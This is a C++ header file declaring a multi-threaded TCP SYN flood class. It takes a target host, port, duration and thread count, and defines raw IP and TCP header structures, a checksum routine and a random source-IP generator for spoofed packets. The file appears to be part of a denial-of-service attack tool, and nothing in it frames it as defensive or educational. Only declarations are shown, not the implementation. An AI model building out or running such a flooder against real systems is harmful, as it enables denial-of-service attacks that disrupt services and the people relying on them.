#pragma once

#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <functional>
#include <chrono>
#include <random>
#include <cstdint>

class TCPSYNFlood {
public:
    TCPSYNFlood(const std::string& target, int duration, int threads, int port,
                std::function<void(const std::string&)> callback = nullptr);
    ~TCPSYNFlood();

    std::map<std::string, std::string> run();
    void stop();

private:
    void worker(int worker_id);
    std::string resolve_host(const std::string& hostname);
    std::string random_ip();

    static uint16_t checksum(const void* data, int len);

    // IP header structure
    struct IPHeader {
        uint8_t  ihl_ver;       // version (4 bits) + header length (4 bits)
        uint8_t  tos;           // type of service
        uint16_t total_length;  // total length
        uint16_t id;            // identification
        uint16_t frag_offset;   // flags + fragment offset
        uint8_t  ttl;           // time to live
        uint8_t  protocol;      // protocol
        uint16_t checksum;      // header checksum
        uint32_t src_addr;      // source address
        uint32_t dst_addr;      // destination address
    };

    // TCP header structure
    struct TCPHeader {
        uint16_t src_port;      // source port
        uint16_t dst_port;      // destination port
        uint32_t seq_num;       // sequence number
        uint32_t ack_num;       // acknowledgment number
        uint8_t  data_offset;   // data offset (4 bits) + reserved (4 bits)
        uint8_t  flags;         // flags
        uint16_t window;        // window size
        uint16_t checksum;      // checksum
        uint16_t urgent_ptr;    // urgent pointer
    };

    // Pseudo header for TCP checksum calculation
    struct PseudoHeader {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t  placeholder;
        uint8_t  protocol;
        uint16_t tcp_length;
    };

    std::string target_;
    int duration_;
    int num_threads_;
    int port_;
    std::function<void(const std::string&)> callback_;

    std::atomic<bool> stop_flag_{false};
    std::atomic<uint64_t> packets_sent_{0};
    std::atomic<uint64_t> failed_packets_{0};

    std::vector<std::thread> threads_;
    std::mutex mtx_;
};
